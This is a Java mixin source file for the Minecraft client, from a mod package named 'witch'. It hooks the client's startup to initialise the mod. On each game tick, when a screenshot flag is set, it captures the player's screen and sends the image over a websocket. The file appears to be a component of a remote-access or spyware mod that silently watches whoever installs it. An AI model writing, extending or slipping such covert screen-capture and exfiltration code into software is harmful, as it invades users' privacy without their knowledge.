package me.soda.witch.mixin;

import me.soda.witch.Witch;
import me.soda.witch.features.Screenshot;
import me.soda.witch.websocket.MessageUtils;
import net.minecraft.client.MinecraftClient;
import org.spongepowered.asm.mixin.Mixin;
import org.spongepowered.asm.mixin.injection.At;
import org.spongepowered.asm.mixin.injection.Inject;
import org.spongepowered.asm.mixin.injection.callback.CallbackInfo;

import java.io.IOException;


@Mixin(value = MinecraftClient.class)
public class MinecraftClientMixin {
    @Inject(method = "<init>", at = @At("TAIL"))
    private void onInit(CallbackInfo info) {
        Witch.init();
    }

    @Inject(at = @At("TAIL"), method = "tick")
    private void onTick(CallbackInfo info) {
        try {
            if (Screenshot.canScreenshot())
                MessageUtils.sendMessage("screenshot", Screenshot.takeScreenshot());
        } catch (IOException e) {
            Witch.printStackTrace(e);
        }
    }
}
